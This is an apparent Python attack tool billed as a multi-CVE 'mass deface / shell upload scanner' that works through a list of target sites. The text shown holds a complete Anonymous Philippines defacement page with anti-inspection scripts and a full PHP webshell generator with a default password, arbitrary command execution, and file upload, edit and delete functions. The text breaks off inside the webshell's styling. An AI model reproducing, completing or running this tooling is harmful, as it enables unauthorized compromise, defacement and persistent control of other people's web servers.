#!/usr/bin/env python3
"""
██████╗ ███████╗ ██████╗ █████╗  ██████╗███████╗
██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝
██║  ██║█████╗  ██║     ███████║██║     █████╗  
██║  ██║██╔══╝  ██║     ██╔══██║██║     ██╔══╝  
██████╔╝███████╗╚██████╗██║  ██║╚██████╗███████╗
╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝ ╚═════╝╚══════╝
  Multi-CVE Mass Deface / Shell Upload Scanner
         Authorized Penetration Testing Tool
===================================================
  CVEs Targeted:
  • CVE-2026-56290  — Joomla Page Builder CK (CVSS 10.0)
  • CVE-2026-48908  — Joomla SP Page Builder  (CVSS 10.0)
  • CVE-2026-48276  — Adobe ColdFusion UAF      (CVSS 10.0)
  • CVE-2024-4577   — PHP CGI Argument Injection (CVSS 9.8)
  • CVE-2025-55912  — ClipBucket ≤5.5.0 UAF     (CVSS 9.8)
  • CVE-2025-0520   — ShowDoc File Upload RCE   (CVSS 9.4)
  • CVE-2025-49113  — RoundCube RCE             (CVSS 9.8)
  • CVE-2026-2113   — tpadmin WebUploader RCE   (CVSS 7.3)
  • CVE-2025-61678  — FreePBX Firmware Upload   (CVSS 9.8)
  • CVE-2026-11344  — Vehicle Management Sys    (CVSS 9.8)
  • CVE-2026-1405   — WP Slider Future          (CVSS 9.8)
  • CVE-2026-40488  — OpenMage Magento-LTS UAF  (CVSS 8.7)
===================================================

USAGE:
    python3 mass_deface.py -f site.txt -o results.txt [-t 20] [--pass PASSWORD]

    --pass    Set custom password for the webshell (default: leisec2024)
    --deface  Only deface + drop webshell (no file browser)
"""

import requests
import urllib3
import sys
import os
import re
import time
import random
import argparse
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin
from colorama import init, Fore, Style
from datetime import datetime
import base64
import json

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── CONFIG ───────────────────────────────────────────────────────────
TIMEOUT = 15
MAX_RETRIES = 2
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
]

# ─── YOUR DEFACE HTML (Anonymous Philippines theme) ──────────────────

DEFACE_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">

  <link rel="SHORTCUT ICON" href="https://i.ibb.co/LXNw220j/anonph.png" type="image/x-icon"/>
  <meta name="Author" content="Anonymous Philippines"/>
  <meta name="copyright" content="Anonymous Philippines"/>
  <meta name="description" content="We are Anonymous, We are legion, We don't forgive, We don't forget, United as one, Divided by zero, Expect us."/>
  <meta name="keywords" content="Anonymous, Anonymous Philippines, Nullsec Philippines, 4HmD0S4, Klammer, To all the Citizens of the Philippines"/>
  <title>Anonymous Philippines</title>
  
  <link href="https://fonts.googleapis.com/css2?family=Goldman&family=Shadows+Into+Light&display=swap" rel="stylesheet">
  
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      user-select: none;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      background: url('https://i.ibb.co/BVpgC6bj/philippineseducationsystem.png') no-repeat center center fixed;
      background-size: cover;
      position: relative;
      font-family: 'Goldman', cursive;
      color: #ffffff;
      min-height: 100vh;
    }
    
    body::before {
      content: "";
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.38);
      backdrop-filter: brightness(1.08) blur(1px);
      z-index: 0;
      pointer-events: none;
    }
    
    body::after {
      content: "";
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: radial-gradient(ellipse at center, transparent 40%, rgba(0,0,0,0.35) 100%);
      pointer-events: none;
      z-index: 1;
    }
    
    .main-content {
      position: relative;
      z-index: 2;
      max-width: 1200px;
      margin: 0 auto;
      padding: 20px 20px 40px 20px;
      backdrop-filter: blur(0px);
    }
    
    .imageSpin {
      animation-name: spin;
      animation-timing-function: linear;
      animation-iteration-count: infinite;
      animation-duration: 5s;
      -webkit-animation-name: spin;
      -webkit-animation-timing-function: linear;
      -webkit-animation-iteration-count: infinite;
      -webkit-animation-duration: 5s;
      max-width: 100%;
      height: auto;
      display: block;
      margin: 0 auto;
      border-radius: 50%;
      box-shadow: 0 0 22px rgba(255, 255, 255, 0.35);
      background: rgba(0,0,0,0.2);
      padding: 4px;
      transition: box-shadow 0.2s;
    }
    
    @keyframes spin {
      from { transform: rotateY(0deg); }
      to { transform: rotateY(360deg); }
    }
    @-webkit-keyframes spin {
      from { -webkit-transform: rotateY(0deg); }
      to { -webkit-transform: rotateY(360deg); }
    }
    
    h1 {
      text-align: center;
      font-size: 60px;
      color: white;
      text-shadow: 0 0 8px #000, 0 0 12px #8B0000;
      letter-spacing: 2px;
      margin-top: 20px;
    }
    
    @media (max-width: 650px) {
      h1 { font-size: 40px; }
      p { font-size: 20px; }
    }
    
    pre {
      font-family: 'Goldman', monospace;
      color: #f0f0f0;
    }
    
    .team-marquee {
      border: 2px solid #aa2e2e;
      background: rgba(0,0,0,0.6);
      color: white;
      margin: 20px 10%;
      padding: 8px;
      font-family: monospace;
      font-size: 1rem;
      border-radius: 12px;
      backdrop-filter: blur(4px);
      box-shadow: 0 0 12px rgba(255,0,0,0.3);
    }
    
    .text-gradient {
      text-align: center;
      background: linear-gradient(to right, #ffffff 20%, #FF0000 40%, #FF0000 60%, #ffffff 80%);
      background-size: 200% auto;
      color: #000;
      background-clip: text;
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      animation: animate 1.5s linear infinite;
      font-weight: bold;
      font-size: 1.8rem;
      margin: 20px 0;
    }
    
    @keyframes animate {
      to { background-position: 200% center; }
    }
    
    p {
      font-size: 1.2rem;
      line-height: 1.5;
      text-align: center;
      margin: 15px 0;
      text-shadow: 0px 1px 3px black;
    }
    
    .footer {
      text-align: center;
      font-size: 20px;
      color: #ffdddd;
      margin-top: 3.5%;
      border-top: 1px solid rgba(255,255,255,0.2);
      padding-top: 20px;
    }
    
    .greetings-block {
      margin: 25px 0 10px;
      text-align: center;
      font-family: 'Shadows Into Light', cursive;
    }
    
    .greetings-block span {
      font-size: 1.25rem;
      display: inline-block;
      background: rgba(0,0,0,0.5);
      padding: 6px 14px;
      border-radius: 40px;
      letter-spacing: 1px;
    }
    
    .hacker-names {
      font-family: 'Shadows Into Light', cursive;
      color: #9effff;
      background: rgba(0,0,0,0.55);
      border-radius: 28px;
      padding: 12px;
      margin: 20px auto;
      width: fit-content;
      max-width: 95%;
      font-size: 1rem;
      backdrop-filter: blur(3px);
    }
    
    .neonMessageZone {
      text-align: center;
      margin: 15px 0;
      font-size: 28px;
      font-weight: bold;
      letter-spacing: 2px;
    }
    
    button, audio {
      display: none;
    }
    
    .callout {
      background: rgba(0, 0, 0, 0.6);
      border-left: 6px solid #c0392b;
      padding: 12px 20px;
      margin: 20px auto;
      border-radius: 24px;
      width: fit-content;
      max-width: 90%;
    }
    
    .war-stop {
      font-size: 2rem;
      font-weight: bold;
      color: #ffb3b3;
    }
    
    hr {
      border-color: rgba(255,255,255,0.2);
      margin: 20px 0;
    }
    
    img {
      filter: drop-shadow(0 0 7px rgba(255, 255, 255, 0.45));
    }
    
    .imageSpin {
      box-shadow: 0 0 22px rgba(255, 255, 255, 0.4) !important;
    }
    
    body, .main-content, pre, p, h1, div, span {
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
    }
  </style>
</head>
<body>

<div class="main-content">
  <center>
    <img src="https://i.ibb.co/LXNw220j/anonph.png" alt="Anonymous Hacker Logo" width="190" height="190" class="imageSpin" />
  </center>
  
  <div class="neonMessageZone">
    <b id="neonContainer" style="font-family: 'Goldman', monospace; font-size: 28px;"></b>
  </div>
  
  <pre style="font: 18px/1.5 'Goldman', monospace; text-align: center; background: rgba(0,0,0,0.4); border-radius: 32px; padding: 16px; margin-top: 15px;">
<font size="3" color="#f0f0f0">
Greetings Citizens of the world, We are Anonymous Philippines.

The safety of Filipino students should never be treated as an afterthought. 
Every child deserves to attend school without fear of violence, neglect, or danger. 
Recent incidents involving violence in and around schools have raised serious concerns about 
the security measures designed to protect students, teachers, and school personnel.

We question why many schools continue to struggle with inadequate security, 
insufficient mental health support, Lack of Sex Education 
overcrowded classrooms, deteriorating facilities, and a lack of emergency preparedness. 
While education is often described as the foundation of the nation's future, 
many students continue to study in environments that fail to provide the safety and protection they deserve. 
The Department of Education must strengthen policies to protect children, 
improve campus safety, provide accessible counseling services, 
implement effective emergency response measures, and ensure that every school is a safe place to learn. 
Parents shouldn't have to worry about whether their children will return home safely after a day of school.

The future of the Philippines depends on its youth. Protecting students is not only an educational responsibility, 
but a moral obligation. Every child has the right to learn in a safe, supportive and secure environment, free from violence and fear.
</font>
  </pre>

  <div style="text-align: center; font-size: 1.9rem; font-weight: bold; color: white; margin: 20px 0 10px 0; text-shadow: 0 2px 5px rgba(0,0,0,0.7);">
    WE ARE ANONYMOUS · WE ARE LEGION
  </div>
  <p style="font-size: 1.5rem; letter-spacing: 1px;">We do not Forgive · We do not Forget</p>
  <p style="font-size: 1.8rem; font-weight: bold; color: white;">EXPECT US!</p>

<audio src="https://d.top4top.io/m_3812oufg31.mp3" autoplay loop id="bgAudio"></audio>

<script type="text/javascript">
(function() {
    'use strict';
    
    function blockContextMenu(e) {
        e = e || window.event;
        if (e.preventDefault) e.preventDefault();
        if (e.stopPropagation) e.stopPropagation();
        if (e.stopImmediatePropagation) e.stopImmediatePropagation();
        return false;
    }
    
    document.addEventListener('contextmenu', blockContextMenu, true);
    document.addEventListener('contextmenu', blockContextMenu, false);
    window.addEventListener('contextmenu', blockContextMenu, true);
    document.body.oncontextmenu = blockContextMenu;
    document.oncontextmenu = blockContextMenu;
    
    function hijackAllContextMenus() {
        var allElements = document.querySelectorAll('*');
        for(var i=0; i<allElements.length; i++) {
            allElements[i].oncontextmenu = blockContextMenu;
        }
    }
    window.addEventListener('DOMContentLoaded', hijackAllContextMenus);
    
    window.addEventListener('keydown', function(e) {
        if(e.key === 'F12' || e.keyCode === 123) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }
        if(e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C' || e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }
        if(e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.keyCode === 85)) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }
        if(e.ctrlKey && (e.key === 's' || e.key === 'S' || e.keyCode === 83)) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }
        if(e.ctrlKey && (e.key === 'o' || e.key === 'O' || e.keyCode === 79)) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }
        if(e.ctrlKey && (e.key === 'p' || e.key === 'P' || e.keyCode === 80)) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }
        if(e.ctrlKey && e.shiftKey && (e.key === 'P' || e.keyCode === 80)) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        }
        if(e.ctrlKey && e.shiftKey && (e.key === 'U' || e.keyCode === 85)) {
            e.preventDefault();
            return false;
        }
        if(e.ctrlKey && e.shiftKey && (e.key === 'E' || e.keyCode === 69)) {
            e.preventDefault();
            return false;
        }
        if(e.metaKey && e.altKey && (e.key === 'I' || e.keyCode === 73)) {
            e.preventDefault();
            return false;
        }
        if(e.metaKey && e.shiftKey && (e.key === 'C' || e.keyCode === 67)) {
            e.preventDefault();
            return false;
        }
        if(e.ctrlKey && e.shiftKey && (e.key === 'D' || e.keyCode === 68)) {
            e.preventDefault();
            return false;
        }
        if(e.ctrlKey && e.shiftKey && (e.key === 'O' || e.keyCode === 79)) {
            e.preventDefault();
            return false;
        }
        if(e.key === 'Insert' || e.keyCode === 45) {
            e.preventDefault();
            return false;
        }
        return true;
    }, false);
    
    window.addEventListener('keyup', function(e) {
        if(e.key === 'PrintScreen' || e.keyCode === 44) {
            e.preventDefault();
            return false;
        }
    });
    
    document.onselectstart = function() { return false; };
    document.ondragstart = function() { return false; };
    document.onmousedown = function(e) {
        if(e.button === 2 || e.button === 3) {
            e.preventDefault();
            return false;
        }
    };
    
    document.addEventListener('copy', function(e) { e.preventDefault(); return false; });
    document.addEventListener('cut', function(e) { e.preventDefault(); return false; });
    document.addEventListener('paste', function(e) { e.preventDefault(); return false; });
    
    let devtoolsOpen = false;
    const element = new Image();
    
    function detectDevTools() {
        const startTime = performance.now();
        debugger;  
        const endTime = performance.now();
        if (endTime - startTime > 100) {
            if (!devtoolsOpen) {
                devtoolsOpen = true;
                triggerDevtoolsReaction();
            }
        } else {
            devtoolsOpen = false;
        }
        requestAnimationFrame(detectDevTools);
    }
    
    function triggerDevtoolsReaction() {
        try {
            document.body.innerHTML = '<div style="background:black; color:#ff0000; text-align:center; font-family:monospace; padding:25%;"><h1>ACCESS DENIED</h1><p>Developer tools are not permitted on this site.</p><p>Your activity has been logged.</p></div>';
            window.stop();
        } catch(e) {}
        setInterval(function() { 
            try { 
                console.clear(); 
                console.log("%cUnauthorized", "color: red");
            } catch(e) {}
        }, 100);
    }
    
    setTimeout(() => {
        detectDevTools();
    }, 1000);
    
    setInterval(function() {
        try {
            if (typeof console !== 'undefined') {
                console.clear();
                console.log('%c[SECURITY] Console Inspection Blocked', 'color: grey');
                console.log('%cUnauthorized Access Detected', 'color: red');
            }
     
            const dummy = new Function('debugger;');
            dummy();
        } catch(e) {}
    }, 200);
    
    window.onload = function() {
        disableSelection(document.body);
        initNeonLegacy();
        document.querySelectorAll('*').forEach(el => {
            el.addEventListener('contextmenu', blockContextMenu, true);
            el.addEventListener('dragstart', (e) => e.preventDefault());
            el.addEventListener('selectstart', (e) => e.preventDefault());
        });
        document.body.addEventListener('keydown', function(e) {
            if(e.ctrlKey && e.shiftKey && (e.keyCode === 67 || e.key === 'C')) {
                e.preventDefault();
                return false;
            }
        });
    };
    
    function disableSelection(el) {
        if (typeof el.onselectstart != "undefined") el.onselectstart = function() { return false; };
        else if (typeof el.style.MozUserSelect != "undefined") el.style.MozUserSelect = "none";
        else el.onmousedown = function() { return false; };
        el.style.cursor = "default";
    }
    
    function blockLongPress(e) {
        e.preventDefault();
        return false;
    }
    document.addEventListener('touchstart', function(e) {
        if(e.touches.length === 1) {
            let timer;
            let longTouch = setTimeout(function() {
                e.preventDefault();
            }, 500);
            e.target.addEventListener('touchend', function() {
                clearTimeout(longTouch);
            });
        }
    });
    
    setInterval(() => {
        if(window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
            triggerDevtoolsReaction();
        }
    }, 1000);
    
    document.addEventListener('keydown', function(e) {
        if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.keyCode === 73) || (e.metaKey && e.altKey && e.keyCode === 73)) {
            e.preventDefault();
            e.stopImmediatePropagation();
            return false;
        }
    });
    
    window.__defineGetter__('console', function() {
        throw new Error('Console access blocked');
    });

    if(window.console && window.console.log) {
        const noop = function(){};
        const secureMethods = ['log', 'info', 'warn', 'error', 'debug', 'trace', 'table', 'dir', 'dirxml', 'group', 'groupCollapsed', 'groupEnd', 'time', 'timeEnd', 'profile', 'profileEnd', 'count'];
        secureMethods.forEach(m => {
            if(console[m]) console[m] = noop;
        });
        console.clear = noop;
    }
    
    function antiDebug() {
        try {
            (function() {
                const dummy = function() { return function() {}; };
                new Function('debugger;')();
            })();
        } catch(e) {}
        setTimeout(antiDebug, 350);
    }
    antiDebug();
    

    function initNeonLegacy() {
        var message = "Hacked By Anonymous Philippines";
        var neonbasecolor = "gray";
        var neontextcolor = "white";
        var neontextcolor2 = "#FFFFA8";
        var flashspeed = 100;
        var flashingletters = 3;
        var flashingletters2 = 1;
        var flashpause = 0;
        
        var container = document.getElementById("neonContainer");
        if(!container) return;
        container.innerHTML = "";
        for(var m = 0; m < message.length; m++) {
            var span = document.createElement("span");
            span.id = "neonlight" + m;
            span.style.color = neonbasecolor;
            span.textContent = message.charAt(m);
            container.appendChild(span);
        }
        
        var n = 0;
        var flashing = null;
        
        function crossref(number) {
            return document.getElementById("neonlight" + number);
        }
        
        function neon() {
            if(n == 0) {
                for(var idx = 0; idx < message.length; idx++) {
                    var el = crossref(idx);
                    if(el) el.style.color = neonbasecolor;
                }
            }
            var currentSpan = crossref(n);
            if(currentSpan) currentSpan.style.color = neontextcolor;
            
            if(n > flashingletters - 1) {
                var backSpan = crossref(n - flashingletters);
                if(backSpan) backSpan.style.color = neontextcolor2;
            }
            if(n > (flashingletters + flashingletters2) - 1) {
                var furtherSpan = crossref(n - flashingletters - flashingletters2);
                if(furtherSpan) furtherSpan.style.color = neonbasecolor;
            }
            
            if(n < message.length - 1) {
                n++;
            } else {
                n = 0;
                if(flashing) clearInterval(flashing);
                setTimeout(function() {
                    beginneon();
                }, flashpause);
                return;
            }
        }
        
        function beginneon() {
            if(flashing) clearInterval(flashing);
            flashing = setInterval(neon, flashspeed);
        }
        beginneon();
    }
    
    var audioEl = document.getElementById("bgAudio");
    if(audioEl) {
        audioEl.volume = 0.4;
        audioEl.play().catch(function(e) {});
    }
    
    document.addEventListener("DOMContentLoaded", function() {
        let content = document.querySelector(".main-content");
        if(content) {
            content.style.opacity = "0";
            content.style.transition = "opacity 1.2s ease";
            setTimeout(() => { content.style.opacity = "1"; }, 100);
        }

        const observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
                mutation.addedNodes.forEach(function(node) {
                    if(node.nodeType === 1) {
                        node.addEventListener('contextmenu', blockContextMenu, true);
                        node.ondragstart = function() { return false; };
                        node.onselectstart = function() { return false; };
                    }
                });
            });
        });
        observer.observe(document.body, { childList: true, subtree: true });
    });
    
    window.addEventListener('load', function() {
        document.body.style.webkitTouchCallout = 'none';
        document.body.style.webkitUserSelect = 'none';
    });
})();
</script>

<style>
  body {
    background: #0a0c12 url('https://i.ibb.co/BVpgC6bj/philippineseducationsystem.png') no-repeat center center fixed;
    background-size: cover;
  }
  body::before {
    background: rgba(10, 8, 15, 0.48);
    backdrop-filter: brightness(1.12) contrast(1.03) blur(1px);
  }
  .main-content {
    background: transparent;
  }
  
  .imageSpin {
    box-shadow: 0 0 24px rgba(255, 255, 255, 0.5) !important;
    transition: box-shadow 0.2s;
  }
  img {
    filter: drop-shadow(0 0 8px rgba(255, 255, 255, 0.5));
  }
  
  .imageSpin:hover {
    box-shadow: 0 0 28px rgba(255, 255, 255, 0.65);
  }
  
  p, pre, .hacker-names {
    transition: all 0.2s;
  }
  .team-marquee marquee {
    font-weight: bold;
  }
  
  pre font[size="3"] {
    line-height: 1.6;
  }
  .footer {
    font-size: 18px;
    letter-spacing: 1px;
  }
  @media (max-width: 800px) {
    .war-stop { font-size: 1.8rem; }
    .callout p { font-size: 1.6rem; }
  }
  ::selection {
    background: none;
    color: inherit;
  }
  body, button, a {
    cursor: default;
  }
  
  .team-marquee {
    border: none !important;
    background: transparent !important;
    box-shadow: none !important;
  }
  marquee {
    font-family: 'Goldman', monospace;
  }
  
  *::-moz-selection { background: transparent; }
  *::selection { background: transparent; }
</style>

</body>
</html>"""

# ─── WEBSHELL (Lei Nullsec PH full file manager) ──────────────────────

def build_webshell(password="leisec2024"):
    """Generate the Lei Nullsec PH webshell with configurable password"""
    webshell_code = f'''<?php
// anti waf tanga
header('X-Powered-By: PHP/7.4.33');
header('Server: Apache/2.4.41 (Ubuntu)');
header('Content-Type: text/html; charset=UTF-8');

$SESSION_TIMEOUT = 1800;
session_start();

$DEFAULT_PASSWORD = "{password}";
$SECURITY_KEY = "NULLSEC_PH_" . md5($_SERVER['HTTP_HOST'] . $DEFAULT_PASSWORD);
$current_script = basename(__FILE__);

$logged_in = isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
$key_valid = isset($_SESSION['security_key']) && $_SESSION['security_key'] === $SECURITY_KEY;

// Handle logout
if (isset($_GET['logout'])) {{
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}}

if (isset($_POST['password']) && !$logged_in) {{
    if ($_POST['password'] === $DEFAULT_PASSWORD) {{
        $_SESSION['logged_in'] = true;
        $_SESSION['security_key'] = $SECURITY_KEY;
        $_SESSION['login_time'] = time();
        $logged_in = true;
        $key_valid = true;
    }} else {{
        $login_error = "Invalid password!";
    }}
}}

if (isset($_POST['get_key']) && isset($_POST['password'])) {{
    if ($_POST['password'] === $DEFAULT_PASSWORD) {{
        $key_display = $SECURITY_KEY;
    }} else {{
        $login_error = "Invalid password!";
    }}
}}

if ($logged_in && (time() - $_SESSION['login_time']) > $SESSION_TIMEOUT) {{
    session_destroy();
    $logged_in = false;
    $key_valid = false;
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}}

function execute_command($cmd) {{
    $output = [];
    $methods = [
        'shell_exec',
        'system',
        'passthru',
        'exec'
    ];
    
    foreach ($methods as $method) {{
        if (function_exists($method)) {{
            ob_start();
            switch ($method) {{
                case 'shell_exec':
                    $result = shell_exec($cmd . ' 2>&1');
                    if ($result) {{
                        $output = explode("\\n", trim($result));
                        break 2;
                    }}
                    break;
                case 'system':
                    system($cmd . ' 2>&1', $return_var);
                    $result = ob_get_contents();
                    if ($result) {{
                        $output = explode("\\n", trim($result));
                        break 2;
                    }}
                    break;
                case 'passthru':
                    passthru($cmd . ' 2>&1', $return_var);
                    $result = ob_get_contents();
                    if ($result) {{
                        $output = explode("\\n", trim($result));
                        break 2;
                    }}
                    break;
                case 'exec':
                    exec($cmd . ' 2>&1', $output, $return_var);
                    if (!empty($output)) {{
                        break 2;
                    }}
                    break;
            }}
            ob_end_clean();
        }}
    }}
    return $output;
}}

$dir = isset($_GET['d']) ? base64_decode($_GET['d']) : getcwd();
$dir = str_replace('\\\\', '/', $dir);
if (substr($dir, -1) != '/') {{
    $dir .= '/';
}}

function delete_directory($dir) {{
    if (!file_exists($dir)) return true;
    if (!is_dir($dir)) return unlink($dir);
    foreach (scandir($dir) as $item) {{
        if ($item == '.' || $item == '..') continue;
        delete_directory($dir . DIRECTORY_SEPARATOR . $item);
    }}
    return rmdir($dir);
}}

function format_size($bytes) {{
    if ($bytes >= 1073741824) return round($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return round($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return round($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}}

function get_perms($path) {{
    return substr(sprintf('%o', fileperms($path)), -4);
}}

if (isset($_POST['action']) && $logged_in) {{
    $action = $_POST['action'];
    $path = $_POST['path'] ?? '';
    $new_name = $_POST['new_name'] ?? '';
    $content = $_POST['content'] ?? '';
    $msg = '';
    
    switch ($action) {{
        case 'delete':
            if (file_exists($path)) {{
                is_dir($path) ? delete_directory($path) : unlink($path);
                $msg = 'Deleted: ' . basename($path);
            }}
            break;
        case 'rename':
            if (rename($path, dirname($path) . '/' . $new_name)) {{
                $msg = 'Renamed to: ' . $new_name;
            }}
            break;
        case 'edit_save':
            if (file_put_contents($path, $content) !== false) {{
                $msg = 'Saved: ' . basename($path);
            }}
            break;
        case 'upload':
            if (isset($_FILES['file']) && $_FILES['file']['error'] == UPLOAD_ERR_OK) {{
                $target = $dir . basename($_FILES['file']['name']);
                if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {{
                    $msg = 'Uploaded: ' . basename($_FILES['file']['name']);
                }}
            }}
            break;
        case 'create_file':
            if (!file_exists($dir . $new_name)) {{
                file_put_contents($dir . $new_name, '');
                $msg = 'Created: ' . $new_name;
            }}
            break;
        case 'create_dir':
            if (!file_exists($dir . $new_name)) {{
                mkdir($dir . $new_name, 0755);
                $msg = 'Created dir: ' . $new_name;
            }}
            break;
    }}
    
    header('Location: ?d=' . base64_encode($dir) . '&msg=' . urlencode($msg));
    exit;
}}

$cmd_output = [];
if (isset($_POST['cmd']) && $logged_in) {{
    $cmd_output = execute_command($_POST['cmd']);
}}

if (isset($_GET['download']) && $logged_in) {{
    $file_path = base64_decode($_GET['download']);
    if (file_exists($file_path) && is_file($file_path)) {{
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
        header('Content-Length: ' . filesize($file_path));
        readfile($file_path);
        exit;
    }}
}}

if (isset($_GET['edit']) && $logged_in) {{
    $edit_file = base64_decode($_GET['edit']);
    $file_content = file_exists($edit_file) ? file_get_contents($edit_file) : '';
}}

if (isset($_GET['rename']) && $logged_in) {{
    $rename_file = base64_decode($_GET['rename']);
}}

?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lei - Nullsec PH Webshell</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            background: #0a0a0a;
            color: #e0e0e0;
            font-family: 'Consolas', 'Courier New', monospace;
            font-size: 13px;
            line-height: 1.5;
            padding: 15px;
        }}
        
        .container {{
            max-width: 1400px;
            margin: 0 auto;
        }}
        
        .top-bar {{
            background: #1e1e1e;
            border: 1px solid #333;
            padding: 8px 12px;
            margin-bottom: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }}
        
        .title {{
            color: #00ff00;
            font-weight: bold;
            font-size: 14px;
        }}
        
        .path {{
            background: #1e1e1e;
            border: 1px solid #333;
            padding: 8px 12px;
            margin-bottom: 15px;
            font-family: 'Consolas', monospace;
            word-break: break-all;
        }}
        
        .path span {{
            color: #00ff00;
        }}
        
        .msg {{
            background: #1e1e1e;
            border: 1px solid #ff3333;
            color: #ff3333;
            padding: 8px 12px;
            margin-bottom: 15px;
        }}
        
        .login-box {{
            max-width: 400px;
            margin: 100px auto;
            background: #1e1e1e;
            border: 1px solid #333;
            padding: 25px;
        }}
        
        .login-box h2 {{
            color: #00ff00;
            margin-bottom: 20px;
            font-size: 18px;
            text-align: center;
        }}
        
        .input-group {{
            margin-bottom: 15px;
        }}
        
        .input-group label {{
            display: block;
            color: #888;
            margin-bottom: 5px;
        }}
        
        .input-group input {{
            width: 100%;
            background: #0a0a0a;
            border: 1px solid #333;
            color: #00ff00;
            padding: 8px 10px;
            font-family: 'Consolas', monospace;
            font-size: 13px;
        }}
        
        .input-group input:focus {{
            outline: none;
            border-color: #00ff00;
        }}
        
        .btn-group {{
            display: flex;
            gap: 10px;
        }}
        
        button, .btn {{
            background: #0a0a0a;
            border: 1px solid #333;
            color: #e0e0e0;
            padding: 8px 15px;
            font-family: 'Consolas', monospace;
            font-size: 13px;
            cursor: pointer;
            text-decoration: none;
            display: inline-block;
        }}
        
        button:hover, .btn:hover {{
            border-color: #00ff00;
            color: #00ff00;
        }}
        
        .btn-green {{
            border-color: #00ff00;
            color: #00ff00;
        }}
        
        .key-display {{
            background: #0a0a0a;
            border: 1px solid #00ff00;
            padding: 15px;
            margin-top: 15px;
            word-break: break-all;
            color: #00ff00;
        }}
        
        .cmd-line {{
            background: #1e1e1e;
            border: 1px solid #333;
            padding: 12px;
            margin-bottom: 15px;
            display: flex;
            gap: 10px;
        }}
        
        .cmd-line input {{
            flex: 1;
            background: #0a0a0a;
            border: 1px solid #333;
            color: #00ff00;
            padding: 6px 10px;
            font-family: 'Consolas', monospace;
            font-size: 13px;
        }}
        
        .cmd-line input:focus {{
            outline: none;
            border-color: #00ff00;
        }}
        
        .output {{
            background: #1e1e1e;
            border: 1px solid #333;
            padding: 15px;
            margin-bottom: 15px;
            max-height: 300px;
            overflow: auto;
        }}
        
        .output pre {{
            color: #00ff00;
            font-family: 'Consolas', monospace;
            white-space: pre-wrap;
            word-wrap: break-word;
        }}
        
        .toolbar {{
            background: #1e1e1e;
            border: 1px solid #333;
            padding: 10px;
            margin-bottom: 15px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }}
        
        .toolbar form {{
            display: flex;
            gap: 5px;
            align-items: center;
        }}
        
        .toolbar input[type="text"] {{
            background: #0a0a0a;
            border: 1px solid #333;
            color: #00ff00;
            padding: 5px 8px;
            font-family: 'Consolas', monospace;
            width: 150px;
        }}
        
        .toolbar input[type="file"] {{
            color: #888;
            font-family: 'Consolas', monospace;
            font-size: 12px;
            max-width: 200px;
        }}
        
        table {{
            width: 100%;
            border-collapse: collapse;
            background: #1e1e1e;
            border: 1px solid #333;
        }}
        
        th {{
            background: #0a0a0a;
            color: #888;
            padding: 8px 10px;
            text-align: left;
            border-bottom: 1px solid #333;
            font-weight: normal;
        }}
        
        td {{
            padding: 6px 10px;
            border-bottom: 1px solid #2a2a2a;
        }}
        
        tr:hover {{
            background: #2a2a2a;
        }}
        
        .dir-row td:first-child {{
            color: #00ff00;
        }}
        
        .file-row td:first-child {{
            color: #888;
        }}
        
        a {{
            color: #e0e0e0;
            text-decoration: none;
        }}
        
        a:hover {{
            color: #00ff00;
        }}
        
        .actions {{
            display: flex;
            gap: 8px;
        }}
        
        .actions a, .actions button {{
            background: none;
            border: none;
            color: #888;
            padding: 2px 0;
            font-size: 12px;
        }}
        
        .actions a:hover, .actions button:hover {{
            color: #00ff00;
        }}
        
        .delete-form {{
            display: inline;
        }}
        
        .delete-btn {{
            background: none;
            border: none;
